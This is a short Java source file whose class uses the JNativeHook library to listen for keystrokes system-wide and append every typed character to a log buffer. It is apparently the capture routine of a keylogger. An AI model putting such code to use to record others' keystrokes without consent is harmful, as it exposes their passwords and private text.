package com.app;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class InterceptKeyboard implements NativeKeyListener {
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent event) {}

	@Override
	public void nativeKeyReleased(NativeKeyEvent event) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent event) {
		if (event.getKeyCode() == CodeKeyboard.ENTER) {
			LogUtil.write.append("\n");
		} else {
			LogUtil.write.append(event.getKeyChar());
		}
	}
}